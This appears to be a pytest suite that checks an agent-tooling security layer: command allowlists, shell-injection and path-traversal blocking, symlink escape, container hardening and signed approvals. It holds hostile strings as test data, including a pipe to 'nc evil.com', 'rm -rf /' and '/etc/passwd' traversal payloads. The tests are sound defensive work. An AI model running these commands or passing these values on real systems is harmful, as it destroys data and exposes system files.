"""
Comprehensive security tests for V4 Control Inversion.
Tests for Phase 0: Security Hardening (BLOCKING).

Requirements:
- All command execution uses shell=False
- Executable allowlist enforced
- Path traversal tests pass (10+ edge cases)
- Symlink escape tests pass (per-component validation)
- Approval signatures verified
- Unauthorized approval attempts rejected
- Container hardening flags applied
"""
import hashlib
import hmac
import os
import pytest
import tempfile
import time
from datetime import datetime, timedelta
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock, patch

from src.v4.security.execution import (
    SecureCommand,
    SandboxConfig,
    ToolSecurityConfig,
    ArgumentRules,
    CommandResult,
    execute_secure,
    SecurityError,
)
from src.v4.security.paths import (
    safe_path,
    validate_glob_pattern,
    PathTraversalError,
)
from src.v4.security.approval import (
    ApprovalRequest,
    Approval,
    ApprovalAuthenticator,
    InvalidSignatureError,
    UnauthorizedApproverError,
    ReplayAttackError,
)


# ============================================================
# Tool Execution Security Tests
# ============================================================

class TestSecureCommand:
    """Test secure command execution."""

    def test_shell_false_enforced(self):
        """Verify all command execution uses shell=False."""
        cmd = SecureCommand(
            executable="/usr/bin/echo",
            args=["hello", "world"],
            working_dir=Path("/tmp"),
        )
        config = ToolSecurityConfig(
            allowed_executables=["/usr/bin/echo"],
            use_sandbox=False,
        )

        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0, stdout=b"hello world", stderr=b"")
            execute_secure(cmd, config)

            # Verify shell=False was used
            call_kwargs = mock_run.call_args[1]
            assert call_kwargs.get("shell") == False

    def test_executable_allowlist_enforced(self):
        """Verify only allowlisted executables can run."""
        cmd = SecureCommand(
            executable="/usr/bin/rm",
            args=["-rf", "/"],
            working_dir=Path("/tmp"),
        )
        config = ToolSecurityConfig(
            allowed_executables=["/usr/bin/echo", "/usr/bin/ls"],
            use_sandbox=False,
        )

        with pytest.raises(SecurityError) as exc:
            execute_secure(cmd, config)
        assert "not allowed" in str(exc.value).lower()

    def test_shell_metacharacters_rejected(self):
        """Verify shell metacharacters in arguments are rejected."""
        metacharacters = [";", "|", "&", "$", "`", "\n", "$(", "${"]
        config = ToolSecurityConfig(
            allowed_executables=["/usr/bin/echo"],
            use_sandbox=False,
        )

        for char in metacharacters:
            cmd = SecureCommand(
                executable="/usr/bin/echo",
                args=[f"hello{char}world"],
                working_dir=Path("/tmp"),
            )
            with pytest.raises(SecurityError) as exc:
                execute_secure(cmd, config)
            assert "invalid argument" in str(exc.value).lower() or "metacharacter" in str(exc.value).lower()

    def test_command_injection_prevented(self):
        """Test that common command injection patterns are blocked."""
        injections = [
            ["hello; rm -rf /"],
            ["hello && cat /etc/passwd"],
            ["hello | nc evil.com 1234"],
            ["$(cat /etc/passwd)"],
            ["`whoami`"],
            ["hello\nrm -rf /"],
        ]
        config = ToolSecurityConfig(
            allowed_executables=["/usr/bin/echo"],
            use_sandbox=False,
        )

        for args in injections:
            cmd = SecureCommand(
                executable="/usr/bin/echo",
                args=args,
                working_dir=Path("/tmp"),
            )
            with pytest.raises(SecurityError):
                execute_secure(cmd, config)

    def test_argument_validation_denied_flags(self):
        """Test that denied flags are rejected."""
        rules = ArgumentRules(
            denied_flags=["--force", "-f", "--hard"],
        )
        config = ToolSecurityConfig(
            allowed_executables=["/usr/bin/git"],
            argument_rules={"git": rules},
            use_sandbox=False,
        )

        for flag in ["--force", "-f", "--hard"]:
            cmd = SecureCommand(
                executable="/usr/bin/git",
                args=["push", flag],
                working_dir=Path("/tmp"),
            )
            with pytest.raises(SecurityError) as exc:
                execute_secure(cmd, config)
            assert "denied flag" in str(exc.value).lower()

    def test_argument_validation_allowed_flags(self):
        """Test that only allowed flags pass when allowlist is specified."""
        rules = ArgumentRules(
            allowed_flags=["-v", "-x", "--tb=short"],
        )
        config = ToolSecurityConfig(
            allowed_executables=["/usr/bin/pytest"],
            argument_rules={"pytest": rules},
            use_sandbox=False,
        )

        # Allowed flags should pass
        cmd = SecureCommand(
            executable="/usr/bin/pytest",
            args=["-v", "-x", "tests/"],
            working_dir=Path("/tmp"),
        )
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0, stdout=b"", stderr=b"")
            execute_secure(cmd, config)  # Should not raise

        # Disallowed flags should fail
        cmd = SecureCommand(
            executable="/usr/bin/pytest",
            args=["--collect-only", "tests/"],
            working_dir=Path("/tmp"),
        )
        with pytest.raises(SecurityError) as exc:
            execute_secure(cmd, config)
        assert "not in allowlist" in str(exc.value).lower()

    def test_argument_validation_allowed_subcommands(self):
        """Test that only allowed subcommands pass."""
        rules = ArgumentRules(
            allowed_subcommands=["status", "diff", "log", "add", "commit"],
        )
        config = ToolSecurityConfig(
            allowed_executables=["/usr/bin/git"],
            argument_rules={"git": rules},
            use_sandbox=False,
        )

        # Allowed subcommands should pass
        cmd = SecureCommand(
            executable="/usr/bin/git",
            args=["status"],
            working_dir=Path("/tmp"),
        )
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0, stdout=b"", stderr=b"")
            execute_secure(cmd, config)  # Should not raise

        # Disallowed subcommands should fail
        cmd = SecureCommand(
            executable="/usr/bin/git",
            args=["push"],
            working_dir=Path("/tmp"),
        )
        with pytest.raises(SecurityError) as exc:
            execute_secure(cmd, config)
        assert "subcommand not allowed" in str(exc.value).lower()

    def test_denied_patterns_rejected(self):
        """Test that arguments matching denied patterns are rejected."""
        rules = ArgumentRules(
            denied_patterns=[r"^--exec=.*", r".*\.\..*"],  # No exec, no parent refs
        )
        config = ToolSecurityConfig(
            allowed_executables=["/usr/bin/git"],
            argument_rules={"git": rules},
            use_sandbox=False,
        )

        for arg in ["--exec=rm -rf /", "../secret", "foo/../bar"]:
            cmd = SecureCommand(
                executable="/usr/bin/git",
                args=["log", arg],
                working_dir=Path("/tmp"),
            )
            with pytest.raises(SecurityError) as exc:
                execute_secure(cmd, config)
            assert "denied pattern" in str(exc.value).lower()


class TestSandboxExecution:
    """Test container sandbox execution."""

    def test_container_hardening_flags(self):
        """Verify container uses security hardening flags."""
        cmd = SecureCommand(
            executable="/usr/bin/pytest",
            args=["-v"],
            working_dir=Path("/tmp/test"),
            sandbox=SandboxConfig(
                use_container=True,
                read_only_rootfs=True,
                network_mode="none",
            ),
        )
        config = ToolSecurityConfig(
            allowed_executables=["/usr/bin/pytest"],
            use_sandbox=True,
        )

        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0, stdout=b"", stderr=b"")
            execute_secure(cmd, config)

            # Get the docker command that was built
            call_args = mock_run.call_args[0][0]

            # Verify security flags are present
            assert "--read-only" in call_args
            assert "--network=none" in call_args
            assert "--cap-drop=ALL" in call_args
            assert "--security-opt=no-new-privileges" in call_args
            assert any("--pids-limit" in arg for arg in call_args)
            assert any("--user" in arg for arg in call_args)

    def test_container_image_pinned_by_digest(self):
        """Verify container image is pinned by SHA256 digest, not :latest."""
        cmd = SecureCommand(
            executable="/usr/bin/echo",
            args=["test"],
            working_dir=Path("/tmp"),
            sandbox=SandboxConfig(use_container=True),
        )
        config = ToolSecurityConfig(
            allowed_executables=["/usr/bin/echo"],
            use_sandbox=True,
            sandbox_image="sandbox-runner@sha256:abc123",
        )

        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0, stdout=b"", stderr=b"")
            execute_secure(cmd, config)

            call_args = mock_run.call_args[0][0]
            # Should use SHA256 digest, not :latest
            assert any("@sha256:" in str(arg) for arg in call_args)
            assert ":latest" not in str(call_args)


# ============================================================
# Path Traversal Prevention Tests (10+ edge cases)
# ============================================================

class TestPathTraversalPrevention:
    """Test path traversal prevention with 10+ edge cases."""

    def setup_method(self):
        """Create temp directory for tests."""
        self.temp_dir = tempfile.mkdtemp()
        self.base_dir = Path(self.temp_dir)

        # Create test structure
        (self.base_dir / "src").mkdir()
        (self.base_dir / "src" / "app").mkdir()
        (self.base_dir / "src" / "app" / "main.py").write_text("# main")

    def teardown_method(self):
        """Clean up temp directory."""
        import shutil
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    # Edge case 1: Simple path traversal with ../
    def test_simple_path_traversal(self):
        """Test simple ../ path traversal is blocked."""
        with pytest.raises(PathTraversalError):
            safe_path(self.base_dir, "../etc/passwd")

    # Edge case 2: Multiple ../ sequences
    def test_multiple_traversal_sequences(self):
        """Test multiple ../ sequences are blocked."""
        with pytest.raises(PathTraversalError):
            safe_path(self.base_dir, "../../../../../../etc/passwd")

    # Edge case 3: Mixed valid and traversal
    def test_mixed_valid_and_traversal(self):
        """Test path that goes down then up out of base."""
        with pytest.raises(PathTraversalError):
            safe_path(self.base_dir, "src/../../../etc/passwd")

    # Edge case 4: Encoded path traversal (URL encoding)
    def test_encoded_path_traversal(self):
        """Test URL-encoded path traversal is blocked."""
        with pytest.raises(PathTraversalError):
            safe_path(self.base_dir, "..%2F..%2Fetc/passwd")

    # Edge case 5: Double-encoded traversal
    def test_double_encoded_traversal(self):
        """Test double URL-encoded traversal is blocked."""
        with pytest.raises(PathTraversalError):
            safe_path(self.base_dir, "..%252F..%252Fetc/passwd")

    # Edge case 6: Backslash traversal (Windows-style)
    def test_backslash_traversal(self):
        """Test backslash path traversal is blocked."""
        with pytest.raises(PathTraversalError):
            safe_path(self.base_dir, "..\\..\\etc\\passwd")

    # Edge case 7: Null byte injection
    def test_null_byte_injection(self):
        """Test null byte injection is blocked."""
        with pytest.raises(PathTraversalError):
            safe_path(self.base_dir, "src/main.py\x00.jpg")

    # Edge case 8: Absolute path injection
    def test_absolute_path_injection(self):
        """Test absolute path injection is blocked."""
        with pytest.raises(PathTraversalError):
            safe_path(self.base_dir, "/etc/passwd")

    # Edge case 9: Tilde expansion
    def test_tilde_expansion(self):
        """Test tilde expansion is blocked."""
        with pytest.raises(PathTraversalError):
            safe_path(self.base_dir, "~/../../etc/passwd")

    # Edge case 10: Path with Unicode tricks
    def test_unicode_normalization_attack(self):
        """Test Unicode normalization attacks are blocked."""
        # U+FF0E is fullwidth period, U+2024 is one dot leader
        with pytest.raises(PathTraversalError):
            safe_path(self.base_dir, "\uff0e\uff0e/etc/passwd")

    # Edge case 11: Path component validation
    def test_path_component_validation(self):
        """Test each path component is validated."""
        with pytest.raises(PathTraversalError):
            # Even if final path resolves inside, intermediate ../ should fail
            safe_path(self.base_dir, "src/../../workflow-orchestrator/src/app")

    # Edge case 12: Valid path succeeds
    def test_valid_path_succeeds(self):
        """Test that valid paths are allowed."""
        result = safe_path(self.base_dir, "src/app/main.py")
        assert result.exists()
        assert str(self.base_dir) in str(result)


class TestSymlinkEscapePrevention:
    """Test symlink escape prevention."""

    def setup_method(self):
        """Create temp directory with symlinks for tests."""
        self.temp_dir = tempfile.mkdtemp()
        self.base_dir = Path(self.temp_dir)

        # Create test structure
        (self.base_dir / "src").mkdir()
        (self.base_dir / "src" / "app.py").write_text("# app")

        # Create external directory
        self.external_dir = tempfile.mkdtemp()
        Path(self.external_dir).joinpath("secret.txt").write_text("secret")

    def teardown_method(self):
        """Clean up temp directories."""
        import shutil
        shutil.rmtree(self.temp_dir, ignore_errors=True)
        shutil.rmtree(self.external_dir, ignore_errors=True)

    def test_symlink_escape_blocked(self):
        """Test symlink pointing outside base is blocked."""
        # Create symlink to external directory
        symlink = self.base_dir / "src" / "escape"
        symlink.symlink_to(self.external_dir)

        with pytest.raises(PathTraversalError) as exc:
            safe_path(self.base_dir, "src/escape/secret.txt")
        assert "symlink" in str(exc.value).lower()

    def test_symlink_within_base_allowed(self):
        """Test symlinks within base directory are allowed."""
        # Create symlink within base
        target = self.base_dir / "src" / "app.py"
        symlink = self.base_dir / "link_to_app.py"
        symlink.symlink_to(target)

        result = safe_path(self.base_dir, "link_to_app.py")
        assert result.exists()

    def test_nested_symlink_escape(self):
        """Test nested symlinks that escape are blocked."""
        # Create chain: link1 -> link2 -> external
        intermediate = self.base_dir / "intermediate"
        intermediate.mkdir()

        link2 = intermediate / "link2"
        link2.symlink_to(self.external_dir)

        link1 = self.base_dir / "link1"
        link1.symlink_to(intermediate)

        with pytest.raises(PathTraversalError):
            safe_path(self.base_dir, "link1/link2/secret.txt")

    def test_per_component_symlink_validation(self):
        """Test symlinks are validated at each path component."""
        # Create deep path with symlink escape in middle
        (self.base_dir / "a" / "b").mkdir(parents=True)
        escape_link = self.base_dir / "a" / "b" / "c"
        escape_link.symlink_to(self.external_dir)

        with pytest.raises(PathTraversalError):
            safe_path(self.base_dir, "a/b/c/secret.txt")


class TestGlobPatternValidation:
    """Test glob pattern validation."""

    def test_traversal_in_glob_rejected(self):
        """Test glob patterns with .. are rejected."""
        assert not validate_glob_pattern("../*")
        assert not validate_glob_pattern("src/../*")
        assert not validate_glob_pattern("**/../*.py")

    def test_absolute_glob_rejected(self):
        """Test absolute glob patterns are rejected."""
        assert not validate_glob_pattern("/etc/*")
        assert not validate_glob_pattern("/home/user/**")

    def test_valid_globs_accepted(self):
        """Test valid glob patterns are accepted."""
        assert validate_glob_pattern("**/*.py")
        assert validate_glob_pattern("src/**")
        assert validate_glob_pattern("tests/*.py")
        assert validate_glob_pattern("*.md")


# ============================================================
# Approval Authentication Tests
# ============================================================

class TestApprovalSignatures:
    """Test HMAC signature verification for approvals."""

    def setup_method(self):
        """Set up test signing key."""
        self.signing_key = b"test-signing-key-32-bytes-long!!"

    def test_approval_signature_verified(self):
        """Test that valid signatures are accepted."""
        request = ApprovalRequest(
            id="req_123",
            workflow_id="wf_abc",
            gate_id="gate_1",
            artifact_hash="sha256:abc123",
            required_approvers=["alice", "bob"],
            created_at=datetime.now(),
            expires_at=datetime.now() + timedelta(hours=24),
        )

        approval = Approval.create(request, "alice", self.signing_key)
        assert approval.verify(self.signing_key)

    def test_invalid_signature_rejected(self):
        """Test that invalid signatures are rejected."""
        request = ApprovalRequest(
            id="req_123",
            workflow_id="wf_abc",
            gate_id="gate_1",
            artifact_hash="sha256:abc123",
            required_approvers=["alice"],
            created_at=datetime.now(),
            expires_at=datetime.now() + timedelta(hours=24),
        )

        approval = Approval.create(request, "alice", self.signing_key)

        # Tamper with the approval
        approval.artifact_hash = "sha256:different"

        assert not approval.verify(self.signing_key)

    def test_wrong_signing_key_rejected(self):
        """Test that approvals with wrong key are rejected."""
        request = ApprovalRequest(
            id="req_123",
            workflow_id="wf_abc",
            gate_id="gate_1",
            artifact_hash="sha256:abc123",
            required_approvers=["alice"],
            created_at=datetime.now(),
            expires_at=datetime.now() + timedelta(hours=24),
        )

        approval = Approval.create(request, "alice", self.signing_key)

        wrong_key = b"wrong-key-32-bytes-long-padding!"
        assert not approval.verify(wrong_key)


class TestApprovalAuthorization:
    """Test approver authorization."""

    def test_unauthorized_approver_rejected(self):
        """Test that unauthorized approvers are rejected."""
        auth = ApprovalAuthenticator(signing_key=b"test-key-32-bytes-long-padding!")

        assert not auth.is_authorized("mallory", ["alice", "bob"])
        assert auth.is_authorized("alice", ["alice", "bob"])

    @pytest.mark.asyncio
    async def test_github_token_verification(self):
        """Test GitHub OAuth token verification."""
        auth = ApprovalAuthenticator(signing_key=b"test-key-32-bytes-long-padding!")

        # Mock GitHub API response
        with patch("httpx.AsyncClient") as mock_client_class:
            mock_client = AsyncMock()
            mock_client_class.return_value.__aenter__.return_value = mock_client
            mock_client.get.return_value = MagicMock(
                status_code=200,
                json=lambda: {"login": "alice"}
            )

            identity = await auth.authenticate("valid_token")
            assert identity == "alice"

    @pytest.mark.asyncio
    async def test_invalid_token_returns_none(self):
        """Test that invalid tokens return None."""
        auth = ApprovalAuthenticator(signing_key=b"test-key-32-bytes-long-padding!")

        with patch("httpx.AsyncClient") as mock_client_class:
            mock_client = AsyncMock()
            mock_client_class.return_value.__aenter__.return_value = mock_client
            mock_client.get.return_value = MagicMock(status_code=401)

            identity = await auth.authenticate("invalid_token")
            assert identity is None


class TestReplayProtection:
    """Test replay attack protection."""

    def test_nonce_prevents_replay(self):
        """Test that nonces prevent replay attacks."""
        auth = ApprovalAuthenticator(signing_key=b"test-key-32-bytes-long-padding!")

        request = ApprovalRequest(
            id="req_123",
            workflow_id="wf_abc",
            gate_id="gate_1",
            artifact_hash="sha256:abc123",
            required_approvers=["alice"],
            created_at=datetime.now(),
            expires_at=datetime.now() + timedelta(hours=24),
        )

        # Create approval with nonce
        approval = Approval.create(request, "alice", auth.signing_key)

        # First use should succeed
        auth.use_nonce(approval.nonce)

        # Replay should fail
        with pytest.raises(ReplayAttackError):
            auth.use_nonce(approval.nonce)

    def test_expired_approval_rejected(self):
        """Test that expired approvals are rejected."""
        auth = ApprovalAuthenticator(signing_key=b"test-key-32-bytes-long-padding!")

        request = ApprovalRequest(
            id="req_123",
            workflow_id="wf_abc",
            gate_id="gate_1",
            artifact_hash="sha256:abc123",
            required_approvers=["alice"],
            created_at=datetime.now() - timedelta(hours=25),
            expires_at=datetime.now() - timedelta(hours=1),
        )

        approval = Approval.create(request, "alice", auth.signing_key)

        with pytest.raises(InvalidSignatureError) as exc:
            auth.validate_approval(approval, request)
        assert "expired" in str(exc.value).lower()


# ============================================================
# SQLite Security Tests
# ============================================================

class TestSQLiteSecurity:
    """Test SQLite schema and connection security."""

    def test_autoincrement_syntax(self):
        """Test that AUTOINCREMENT syntax is correct."""
        from src.v4.security.storage import EventStore

        # Create in-memory database
        store = EventStore(":memory:")

        # Should not raise syntax error
        store._init_schema()

        # Verify schema is correct
        cursor = store._conn.execute(
            "SELECT sql FROM sqlite_master WHERE name='events'"
        )
        schema = cursor.fetchone()[0]
        # SQLite uses "INTEGER PRIMARY KEY AUTOINCREMENT", not "AUTOINCREMENT" alone
        assert "INTEGER PRIMARY KEY" in schema

    def test_busy_timeout_configured(self):
        """Test that busy_timeout is configured for concurrency."""
        from src.v4.security.storage import EventStore

        store = EventStore(":memory:")

        # Check pragma
        cursor = store._conn.execute("PRAGMA busy_timeout")
        timeout = cursor.fetchone()[0]
        assert timeout >= 5000  # At least 5 seconds

    def test_wal_mode_enabled(self):
        """Test that WAL mode is enabled for better concurrency."""
        from src.v4.security.storage import EventStore

        # Need file-based DB for WAL
        with tempfile.NamedTemporaryFile(suffix=".db", delete=False) as f:
            db_path = f.name

        try:
            store = EventStore(db_path)

            cursor = store._conn.execute("PRAGMA journal_mode")
            mode = cursor.fetchone()[0]
            assert mode.lower() == "wal"
        finally:
            os.unlink(db_path)
